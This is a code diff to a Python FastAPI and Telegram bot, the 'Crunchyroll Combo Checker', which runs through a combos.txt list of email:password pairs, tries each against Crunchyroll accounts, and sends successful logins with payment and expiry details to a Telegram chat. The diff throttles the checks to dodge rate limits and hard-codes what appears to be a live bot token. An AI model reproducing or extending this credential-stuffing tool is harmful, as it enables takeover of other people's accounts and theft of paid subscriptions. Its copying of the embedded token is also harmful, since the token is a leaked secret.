@@ -6,21 +6,15 @@ from uuid import uuid1
 from fastapi import FastAPI, Request
 import uvicorn
 
-app = FastAPI(title="Crunchyroll Checker Bot")
+app = FastAPI(title="Crunchyroll Combo Checker Bot")
 
-# ====================== PUT YOUR VALUES HERE ======================
-BOT_TOKEN = "8677251975:AAGuEGmCIvQLUKO4j4dM7wGYMAExldG7ftM"   # ←←← PUT YOUR BOT TOKEN HERE
-CHAT_ID = "8677251975"                                           # ←←← PUT YOUR TELEGRAM CHAT ID HERE
-COMBO_FILE = "combos.txt"                                       # Change only if your file has different name
-# =================================================================
+# ====================== YOUR VALUES ======================
+BOT_TOKEN = "8677251975:AAGuEGmCIvQLUKO4j4dM7wGYMAExldG7ftM"
+CHAT_ID = "8677251975"          # ←←← CHANGE THIS TO YOUR REAL CHAT ID (see /start message)
+COMBO_FILE = "combos.txt"
+# ========================================================
 
-if not BOT_TOKEN or not BOT_TOKEN.startswith("7") or len(BOT_TOKEN) < 40:
-    print("ERROR: Please put a valid BOT_TOKEN in the code!")
-
-if not CHAT_ID or not CHAT_ID.isdigit():
-    print("ERROR: Please put a valid numeric CHAT_ID in the code!")
-
-# Telegram send message helper
+# Telegram helper
 def send_telegram(text: str):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -118,7 +112,7 @@ def check_account(email: str, pasw: str):
 ┃Payment ⥤ {payment}
 ┃Expiry ⥤ {expiry}
 ┗━━━━━━━━━━━⊛
-# Crunchyroll Checker Bot
+# Crunchyroll Combo Checker
 """
                 send_telegram(msg)
                 return "HIT"
@@ -145,12 +139,12 @@ async def telegram_webhook(request: Request):
         chat_id = str(message.get("chat", {}).get("id"))
         text = message.get("text", "").strip()
 
-        # Security: Only respond to your chat ID
+        # Security: Only your chat
         if chat_id != CHAT_ID:
             return {"ok": True}
 
         if text == "/start":
-            await asyncio.to_thread(send_telegram, "✅ Crunchyroll Checker Bot is Online!\n\nSend /check to start checking your combos.")
+            await asyncio.to_thread(send_telegram, f"✅ Crunchyroll Combo Checker Bot is Online!\n\nYour Chat ID: <code>{chat_id}</code>\n\nSend /check to start checking combos.txt")
 
         elif text == "/check":
             await asyncio.to_thread(send_telegram, "🚀 Starting combo check... Please wait.")
@@ -171,7 +165,7 @@ async def telegram_webhook(request: Request):
                         check_account(email.strip(), pasw.strip())
                         if i % 10 == 0:
                             await asyncio.to_thread(send_telegram, f"Progress: {i}/{total}")
-                        time.sleep(1.5)  # Rate limit protection
+                        time.sleep(1.5)  # rate limit protection
                     except:
                         continue
 
@@ -187,9 +181,9 @@ async def telegram_webhook(request: Request):
 
 @app.get("/")
 async def root():
-    return {"status": "Crunchyroll Checker Bot is running (Webhook mode)"}
+    return {"status": "Crunchyroll Combo Checker Bot is running (Webhook mode)"}
 
 
 if __name__ == "__main__":
-    print("Starting Crunchyroll Checker Bot...")
+    print("Starting Crunchyroll Combo Checker Bot...")
     uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
